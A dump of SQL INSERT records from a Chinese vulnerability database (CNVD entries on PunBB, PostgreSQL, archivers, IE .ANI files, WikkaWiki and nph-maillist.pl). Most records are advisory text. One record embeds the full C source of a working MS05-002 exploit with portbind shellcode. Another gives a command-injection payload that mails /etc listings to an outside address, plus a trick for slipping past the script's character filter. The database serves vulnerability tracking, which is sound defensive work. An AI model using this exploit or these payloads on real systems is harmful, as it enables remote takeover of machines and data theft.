这段代码没有验证$temp变量，因此如果打开了register_globals的话，攻击者可以就通过GET、POST或COOKIE变量提供任意key=value字符串。成功利用这个漏洞的攻击者可以获得对论坛的管理访问。', 'http://marc.theaimsgroup.com/?l=bugtraq&amp;m=112084384928950&amp;w=2', '建议：厂商补丁：PunBB-----目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载1.2.6版本：http://www.punbb.org/download/punbb-1.2.6.tar.gz', 'PunBB profile.php脚本用户配置文件编辑模块SQL注入漏洞的补丁', '已验证', '2013-03-14', '2014-01-21', '2014-01-21', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CNVD-2006-3407', 'CNVD-2006-3407', '2006-05-24', '中', '(暂无)', '', '', '危害远程攻击者可以利用漏洞进行SQL注入攻击，可能访问修改敏感数据。攻击所需条件攻击者必须访问PostgreSQL。漏洞信息PostgreSQL是一款流行的数据库程序。PostgreSQL在多字节转换实现上存在问题，远程攻击者可以利用漏洞进行SQL注入攻击，可能访问修改敏感数据。问题是当提供非法编码的多字节数据时，客户端和服务端的转换存在不同的行为，而导致SQL注入的发生，CVE-2006-2313中描述的问题是客户端转义编码一般没有使用任何编码，针对任意高位设置的字节认作为单个非ASCII字符，而PostgreSQL服务有这不同的行为，因此可导致错误产生，攻击者如果构建非法编码的多字节字符，可绕过标准的字符转义方法，导致后续的字符成为SQL命令提交给服务程序并执行。CVE-2006-2314：当操作多字节编码操作允许0x5c作为多字节字符的拽尾字节时时广泛使用的ASCII单引号&quot;\'&quot;转义为&quot;\\'&quot;是不安全的，这至少包含在SJIS, BIG5, GBK, GB18030,和UNC中，应用程序使用这个转换，当SQL命令中嵌入不可信字符串时，与PostgreSQL服务器通信时可导致SQL注入。PostgreSQL 8.1.4, 8.0.8, 7.4.13, 7.3.15版本在当客户端使用这些编码时已经修改拒绝使用&quot;\\'&quot;。更详细情况可参看如下链接：http://www.postgresql.org/docs/techdocs.50厂商解决方案升级程序：PostgreSQL PostgreSQL 7.3 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.1 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.10 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.11 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.12 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.13 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.14 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.2 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.3 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.4 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.6 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.8 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.3.9 PostgreSQL postgresql-7.3.15.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 3.15%2Fpostgresql-7.3.15.tar.bz2PostgreSQL PostgreSQL 7.4 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.1 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.10 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.11 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.12 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.2 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.3 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.4 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.5 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.6 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.7 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.8 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 7.4.9 PostgreSQL postgresql-7.4.13.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv7. 4.13%2Fpostgresql-7.4.13.tar.bz2PostgreSQL PostgreSQL 8.0 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.0.1 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.0.2 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.0.3 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.0.4 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.0.5 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.0.6 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.0.7 PostgreSQL postgresql-8.0.8.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 0.8%2Fpostgresql-8.0.8.tar.bz2PostgreSQL PostgreSQL 8.1 PostgreSQL postgresql-8.1.4.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 1.4%2Fpostgresql-8.1.4.tar.bz2PostgreSQL PostgreSQL 8.1.1 PostgreSQL postgresql-8.1.4.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 1.4%2Fpostgresql-8.1.4.tar.bz2PostgreSQL PostgreSQL 8.1.2 PostgreSQL postgresql-8.1.4.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 1.4%2Fpostgresql-8.1.4.tar.bz2PostgreSQL PostgreSQL 8.1.3 PostgreSQL postgresql-8.1.4.tar.bz2http://wwwmaster.postgresql.org/download/mirrors-ftp?file=source%2Fv8. 1.4%2Fpostgresql-8.1.4.tar.bz2', 'http://www.securityfocus.com/archive/1/archive/1/435038/100/0/threaded  http://www.securityfocus.com/archive/1/archive/1/435161/100/0/threaded  http://archives.postgresql.org/pgsql-announce/2006-05/msg00010.php  http://www.postgresql.org/docs/techdocs.50  http://www.debian.org/security/2006/dsa-1087  http://security.gentoo.org/glsa/glsa-200607-04.xml  http://frontal2.mandriva.com/security/advisories?name=MDKSA-2006:098  http://www.redhat.com/support/errata/RHSA-2006-0526.html  ftp://patches.sgi.com/support/free/security/advisories/20060602-01-U.asc  http://lists.suse.com/archive/suse-security-announce/2006-Jun/0002.html  http://www.trustix.org/errata/2006/0032/  http://www.ubuntulinux.org/support/documentation/usn/usn-288-1  http://www.ubuntu.com/usn/usn-288-2  http://www.securityfocus.com/bid/18092  http://www.frsirt.com/english/advisories/2006/1941  http://securitytracker.com/id?1016142  http://secunia.com/advisories/20231  http://secunia.com/advisories/20232  http://secunia.com/advisories/20314  http://secunia.com/advisories/20451  http://secunia.com/advisories/20503  http://secunia.com/advisories/20555  http://secunia.com/advisories/20782  http://secunia.com/advisories/20653  http://xforce.iss.net/xforce/xfdb/26627  http://secunia.com/advisories/20435  http://secunia.com/advisories/21001', '', '(无补丁信息)', '(暂无验证信息)', '2006-05-24', '2006-05-24', '2006-05-24', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('多种压缩工具处理路径名不正确漏洞', 'CNVD-2002-4315', '2002-12-17', '中', '(暂无)', '', '', '多个压缩工具存在安全问题。      多个压缩工具在解压.tar压缩档时不正确处理路径名，远程攻击者可以利用这个漏洞诱骗用户解压包含恶意路径名的文件到其他目录中。      多种压缩工具如cpio、Winzip、PKZip、WinRar、SpeedCommander、Squeez、ZipMagic在处理.tar文件时存在目录遍历漏洞，在解压.tar文件时，如果某一文件的路径名字符串包含\'/\'字符，大多数程序在解压的时候可以正确剔除，但是它们没有充分检查包含\'../\'字符的路径名，在解压的时候就可以把类似的文件存放到原用户指定目录之外的位置上，通过诱使用户把恶意文件解压到任意目录，就可以导致以高权限覆盖系统任意文件，或覆盖到远程可访问目录，造成任意代码可远程执行等恶意操作。      另外Windows平台下对\'..\\'字符缺少过滤，也可以导致目录遍历攻击。', '', 'RARLAB  ------  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：      RARLAB Upgrade WinRAR 3.10 beta 5   http://www.rarlabs.com/rar/wrar31b5.exe    WinZip  ------  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：      WinZip Upgrade WinZip 8.1 SR-1   http://www.winzip.com/wz81sr1.htm', '(无补丁信息)', '(暂无验证信息)', '2002-12-17', '2002-12-17', '2002-12-24', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CNVD-2005-0287', 'CNVD-2005-0287', '2005-01-24', '中', '(暂无)', '', '', '处理光标、动画光标和图标格式的方式中存在远程执行代码漏洞。 攻击者可以通过构建恶意光标/图标来利用此漏洞，如果用户访问了恶意网站或查看了恶意的电子邮件，此漏洞就可能允许远程执行代码。 成功利用此漏洞的攻击者可以完全控制受影响的系统。测试代码：/\* HOD-ms05002-ani-expl.c: 2005-01-10: PUBLIC v.0.2 \* \* Copyright ? 2004-2005 houseofdabus. \* \* (MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit \* (CAN-2004-1049) \* \* \* \*                 .::[ houseofdabus ]::. \* \* \* \* (universal -- for all affected systems) \* --------------------------------------------------------------------- \* Description: \*    A remote code execution vulnerability exists in the way that \*    cursor, animated cursor, and icon formats are handled.  An attacker \*    could try to exploit the vulnerability by constructing a malicious \*    cursor or icon file that could potentially allow remote code \*    execution if a user visited a malicious Web site or viewed a \*    malicious e-mail message. An attacker who successfully exploited \*    this vulnerability could take complete control of an affected \*    system. \* \* --------------------------------------------------------------------- \* Patch: \* http://www.microsoft.com/technet/security/Bulletin/MS05-002.mspx \* \* --------------------------------------------------------------------- \* Tested on: \*    - Windows Server 2003 \*    - Windows XP SP1 \*    - Windows XP SP0 \*    - Windows 2000 SP4 \*    - Windows 2000 SP3 \*    - Windows 2000 SP2 \* \* --------------------------------------------------------------------- \* Compile: \* \* Win32/VC++  : cl -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c \* Win32/cygwin: gcc -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c \* Linux       : gcc -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c \* \* --------------------------------------------------------------------- \* Example: \* \* C:\&gt;HOD-ms05002-ani-expl.exe poc 7777 \* &amp;lt;&hellip;&gt; \* [\*] Creating poc.ani file &hellip; Ok \* [\*] Creating poc.html file &hellip; Ok \* \* C:\&gt; \* \* start IE -&gt; C:\poc.html \* \* C:\&gt;telnet localhost 7777 \* Microsoft Windows 2000 [Version 5.00.2195] \* ? Copyright 1985-2000 Microsoft Corp. \* \* C:\Documents and Settings\Administrator\Desktop&gt; \* \* --------------------------------------------------------------------- \* \*   This is provided as proof-of-concept code only for educational \*   purposes and testing by authorized individuals with permission to \*   do so. \* \*/#include &amp;lt;stdio.h&gt;#include &amp;lt;stdlib.h&gt;/\* ANI header \*/unsigned char aniheader[] =&quot;\x52\x49\x46\x46\x9c\x18\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68&quot;&quot;\x7c\x03\x00\x00\x24\x00\x00\x00\x08\x00\x00\x00\x08\x00\x00\x00&quot;&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;/\* jmp offset, no Jitsu \*/&quot;\x77\x82\x40\x00\xeb\x64\x90\x90\x77\x82\x40\x00\xeb\x64\x90\x90&quot;&quot;\xeb\x54\x90\x90\x77\x82\x40\x00\xeb\x54\x90\x90\x77\x82\x40\x00&quot;&quot;\xeb\x44\x90\x90\x77\x82\x40\x00\xeb\x44\x90\x90\x77\x82\x40\x00&quot;&quot;\xeb\x34\x90\x90\x77\x82\x40\x00\xeb\x34\x90\x90\x77\x82\x40\x00&quot;&quot;\xeb\x24\x90\x90\x77\x82\x40\x00\xeb\x24\x90\x90\x77\x82\x40\x00&quot;&quot;\xeb\x14\x90\x90\x77\x82\x40\x00\xeb\x14\x90\x90\x77\x82\x40\x00&quot;&quot;\x77\x82\x40\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;;/\* portbind shellcode \*/unsigned char shellcode[] =&quot;\xeb\x70\x56\x33\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0c\x8b\x40\x0c&quot;&quot;\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b&quot;&quot;\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78&quot;&quot;\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b&quot;&quot;\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03&quot;&quot;\xf8\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b&quot;&quot;\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c&quot;&quot;\x61\xc3\xeb\x3d\xad\x50\x52\xe8\xa8\xff\xff\xff\x89\x07\x83\xc4&quot;&quot;\x08\x83\xc7\x04\x3b\xf1\x75\xec\xc3\x8e\x4e\x0e\xec\x72\xfe\xb3&quot;&quot;\x16\x7e\xd8\xe2\x73\xad\xd9\x05\xce\xd9\x09\xf5\xad\xa4\x1a\x70&quot;&quot;\xc7\xa4\xad\x2e\xe9\xe5\x49\x86\x49\xcb\xed\xfc\x3b\xe7\x79\xc6&quot;&quot;\x79\x83\xec\x60\x8b\xec\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5e&quot;&quot;\xe8\x3d\xff\xff\xff\x8b\xd0\x83\xee\x36\x8d\x7d\x04\x8b\xce\x83&quot;&quot;\xc1\x10\xe8\x9d\xff\xff\xff\x83\xc1\x18\x33\xc0\x66\xb8\x33\x32&quot;&quot;\x50\x68\x77\x73\x32\x5f\x8b\xdc\x51\x52\x53\xff\x55\x04\x5a\x59&quot;&quot;\x8b\xd0\xe8\x7d\xff\xff\xff\xb8\x01\x63\x6d\x64\xc1\xf8\x08\x50&quot;&quot;\x89\x65\x34\x33\xc0\x66\xb8\x90\x01\x2b\xe0\x54\x83\xc0\x72\x50&quot;&quot;\xff\x55\x24\x33\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff\x55\x14&quot;&quot;\x8b\xf0\x33\xc0\x33\xdb\x50\x50\x50\xb8\x02\x01\x11\x5c\xfe\xcc&quot;&quot;\x50\x8b\xc4\xb3\x10\x53\x50\x56\xff\x55\x18\x53\x56\xff\x55\x1c&quot;&quot;\x53\x8b\xd4\x2b\xe3\x8b\xcc\x52\x51\x56\xff\x55\x20\x8b\xf0\x33&quot;&quot;\xc9\xb1\x54\x2b\xe1\x8b\xfc\x57\x33\xc0\xf3\xaa\x5f\xc6\x07\x44&quot;&quot;\xfe\x47\x2d\x57\x8b\xc6\x8d\x7f\x38\xab\xab\xab\x5f\x33\xc0\x8d&quot;&quot;\x77\x44\x56\x57\x50\x50\x50\x40\x50\x48\x50\x50\xff\x75\x34\x50&quot;&quot;\xff\x55\x08\xf7\xd0\x50\xff\x36\xff\x55\x10\xff\x77\x38\xff\x55&quot;&quot;\x28\xff\x55\x0c&quot;;#define SET_PORTBIND_PORT(buf, port)    \*(unsigned short \*)(((buf)+300)) = (port)unsigned char discl[] =&quot;This is provided as proof-of-concept code only for educational&quot;&quot; purposes and testing by authorized individuals with permission&quot;&quot; to do so.&quot;;unsigned char html[] =&quot;&amp;lt;html&gt;\n&quot;&quot;(MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit&quot;&quot;&amp;lt;br&gt;Copyright ? 2004-2005 .: houseofdabus :.&amp;lt;br&gt;&amp;lt;a href =\&quot;&quot;&quot;http://www.microsoft.com/technet/security/Bulletin/MS05-002.mspx\&quot;&gt;&quot;&quot;Patch (MS05-002)&amp;lt;/a&gt;\n&quot;&quot;&amp;lt;script&amp;gt;alert(\&quot;%s\&quot;)&amp;lt;/script&amp;gt;\n&amp;lt;head&gt;\n\t&amp;lt;style&gt;\n&quot;&quot;\t\t\* {CURSOR: url(\&quot;%s.ani\&quot;)}\n\t&amp;lt;/style&gt;\n&amp;lt;/head&gt;\n&quot;&quot;&amp;lt;/html&gt;&quot;;unsigned shortfixx(unsigned short p){        unsigned short r = 0;        r  = (p &amp; 0xFF00) &gt;&gt; 8;        r |= (p &amp; 0x00FF) &amp;lt;&amp;lt; 8;return r;}voidusage(char \*prog){        printf(&quot;Usage:\n&quot;);        printf(&quot;%s &amp;lt;file&gt; &amp;lt;bindport&gt;\n\n&quot;, prog);        exit(0);}intmain(int argc, char \*\*argv){        FILE \*fp;        unsigned short port;        unsigned char f[256+5] = &quot;&quot;;        unsigned char anib[912] = &quot;&quot;;        printf(&quot;\n(MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit\n\n&quot;);        printf(&quot;\tCopyright ? 2004-2005 .: houseofdabus :.\n\n\n&quot;);        printf(&quot;Tested on all affected systems:\n&quot;);        printf(&quot;   [+] Windows Server 2003\n   [+] Windows XP SP1, SP0\n&quot;);        printf(&quot;   [+] Windows 2000 All SP\n\n&quot;);        printf(&quot;%s\n\n&quot;, discl);        if ( (sizeof(shellcode)-1) &gt; (912-sizeof(aniheader)-3) ) {                printf(&quot;[-] Size of shellcode must be &amp;lt;= 686 bytes\n&quot;);                return 0;        }        if (argc &amp;lt; 3) usage(argv[0]);        if (strlen(argv[1]) &gt; 256) {                printf(&quot;[-] Size of filename must be &amp;lt;=256 bytes\n&quot;);                return 0;        }        /\* creating ani file \*/        strcpy(f, argv[1]);        strcat(f, &quot;.ani&quot;);        printf(&quot;[\*] Creating %s file &hellip;&quot;, f);        fp = fopen(f, &quot;wb&quot;);        if (fp == NULL) {                printf(&quot;\n[-] error: can\\'t create file: %s\n&quot;, f);                return 0;        }        memset(anib, 0x90, 912);        /\* header \*/        memcpy(anib, aniheader, sizeof(aniheader)-1);        /\* shellcode \*/        port = atoi(argv[2]);        SET_PORTBIND_PORT(shellcode, fixx(port));        memcpy(anib+sizeof(aniheader)-1, shellcode, sizeof(shellcode)-1);        fwrite(anib, 1, 912, fp);        printf(&quot; Ok\n&quot;);        fclose(fp);        /\* creating html file \*/        f[0] = \'\0\';        strcpy(f, argv[1]);        strcat(f, &quot;.html&quot;);        printf(&quot;[\*] Creating %s file &hellip;&quot;, f);        fp = fopen(f, &quot;wb&quot;);        if (fp == NULL) {                printf(&quot;\n[-] error: can\\'t create file: %s\n&quot;, f);                return 0;        }        sprintf(anib, html, discl, argv[1]);        fwrite(anib, 1, strlen(anib), fp);        printf(&quot; Ok\n&quot;);        fclose(fp);return 0;}修补方案：Microsoft Windows NT Server 4.0 Service Pack 6a：http://www.microsoft.com/downloads/details.aspx?displaylang=zh-cn&amp;FamilyID=4604400a-287e-48cc-91b1-bee44eea588cMicrosoft Windows 2000 Service Pack 3 和 Microsoft Windows 2000 Service Pack 4 ：http://www.microsoft.com/downloads/details.aspx?displaylang=zh-cn&amp;FamilyID=722c6c65-3f6c-4029-8eb7-d4612a785e78Microsoft Windows XP Service Pack 1：http://www.microsoft.com/downloads/details.aspx?displaylang=zh-cn&amp;FamilyID=8850954d-57d9-4d23-9aa1-1ccf6085a057Microsoft Windows Server 2003 ：http://www.microsoft.com/downloads/details.aspx?displaylang=zh-cn&amp;FamilyID=cbccadf6-449a-4d74-937d-4087a6e6c1c2', 'http://www.securityfocus.com/bid/12233  http://www.microsoft.com/technet/Security/bulletin/ms05-002.mspx  http://www.us-cert.gov/cas/techalerts/TA05-012A.html  http://www.kb.cert.org/vuls/id/625856  http://www.xfocus.net/flashsky/icoExp/index.html  http://marc.theaimsgroup.com/?l=bugtraq&amp;m=110382891718076&amp;w=2,', '', '(无补丁信息)', '(暂无验证信息)', '2005-01-24', '2005-01-24', '2005-01-24', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('WikkaWiki未限制文件上传漏洞（CNVD-2011-5147）', 'CNVD-2011-5147', '2011-12-05', '中', 'WikkaWiki WikkaWiki 1.1.6.5  WikkaWiki WikkaWiki 1.1.6 .0  WikkaWiki WikkaWiki 1.1.6 .2  WikkaWiki WikkaWiki 1.1.6.1  WikkaWiki WikkaWiki 1.3.2  WikkaWiki WikkaWiki 1.1.6.3  WikkaWiki WikkaWiki 1.1.6.6', '', 'CVE-2011-4449', 'WikkaWiki是一个用PHP语言编写的轻量级Wiki引擎，后台数据使用MySQL数据库存储。/actions/files/files.php存在未限制文件上传漏洞：267. { 268. $strippedname = str_replace(\'\\'\', \'\', $_FILES[\'file\'][\'name\']); 269. $strippedname = rawurlencode($strippedname); 270. $strippedname = stripslashes($strippedname); 271. $destfile = $upload_path.DIRECTORY_SEPARATOR.$strippedname; #89 272.  273. if (!file_exists($destfile)) 274. { 275. if (move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], $destfile)) 276. { 277. $notification_msg = T_(&quot;File was successfully uploaded.&quot;); 278. } 如果启用\'INTRANET_MODE\'或攻击者使用上个漏洞成功进行了会话劫持攻击，由于266行不充分输入过滤可上传包含多个扩展的文件。', 'http://www.securityfocus.com/archive/1/520687', '', '(无补丁信息)', '(暂无验证信息)', '2011-12-02', '2011-12-05', '2011-12-05', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('nph-maillist.pl[cgi] 字符过滤漏洞', 'CNVD-2001-0891', '2001-04-13', '低', '(暂无)', '', '', '邮件列表生成器是以 web 作界面的脚本，它使得站点访问者可以留下自己的电子邮件地址，以便在站点更新时可以得到通知。 这个脚本也提供功能，使得用户可以从 web 浏览器来新建或修改他/她要发送的消息，消息将发向邮件列表中列出的地址。还可以用它来维护已创建的邮件列表。 脚本有两个部分：nph-maillist.pl 承担 web 界面部分的所有功能；mailengine.pl 在后台运行，直到所有列出的要发的邮件都发出为止。 在 mailengine.pl 脚本中有如下一段编码： $mailprog=&quot;/usr/sbin/sendmail&quot;;$mailfile = &quot;mail.txt&quot;;open (BSS, $mailfile) || die &quot;Cannot open $mailfile&quot;;@mailf = &amp;lt;BSS&gt;;close (BSS);foreach $SIZE (@mailf) {  $SIZE =~ s/\n//g;  open (MAIL, &quot;|$mailprog $SIZE&quot;) || die &quot;Cannot open $mailprog&quot;; 其中 $mailfile 变量是存有邮件地址的文件(不是 PostgreSql 格式)。如果我们发送象下面这样的邮件地址： urabura@matura.pl ;ls -al /etc|mail root@bigbrother.pl 把它送给 mailengine.pl，我们就可以执行命令。 再看 maillist.pl，它有下面的一段编码： if ($FORM{\'emailaddress\'} !~ /\@/) { &amp;bad_email();}if ($FORM{\'emailaddress\'} !~ /\./) { &amp;bad_email();}if ($FORM{\'emailaddress\'} =~ /\ /) { &amp;bad_email();}if ($FORM{\'emailaddress\'} =~ /\)/) { &amp;bad_email();}if ($FORM{\'emailaddress\'} =~ /\(/) { &amp;bad_email();}if ($FORM{\'emailaddress\'} =~ /\:/) { &amp;bad_email();}if ($FORM{\'emailaddress\'} =~ /\//) { &amp;bad_email();}if ($FORM{\'emailaddress\'} =~ /\\/) { &amp;bad_email();}if ($FORM{\'emailaddress\'} =~ /\http:/) { &amp;bad_email();} 其中 emailaddress 是贴上去的邮件地址。我们必须加上 \'@\' 和 \'.\' 字符，这没有问题。我们喜欢 \' \'、\'\\'、\'/\' 这些字符，但我们不能使用它们。脚本作者没有处理 \'`\' 这个字符，因此我们可以把命令中的 \'/\' 换为    `head -n1 nph-maillist.pl|cut -c3` 我们不能使用空格字符，但我们可以使用 \'\t\'。因此，如果我们把 \'/\' 换成    `head\t-n1\tnph-maillist.pl|cut\t-c3` nph-maillist.cgi 就能接受它了。一旦把 \'/\'换成别的，就可以把任何&quot;坏&quot;字符换成能被nph-maillist.cgi 接受的字符了。 &amp;lt;\* 来源：Matt Tourtillott (&amp;lt;a href=\'mailto:mrt@marketrends.net\'&gt;mrt@marketrends.net&amp;lt;/a&gt;) \*&gt;', '', '', '(无补丁信息)', '已验证', '2001-04-13', '2001-04-13', '2001-04-13', '(无附件)')"
------------------------
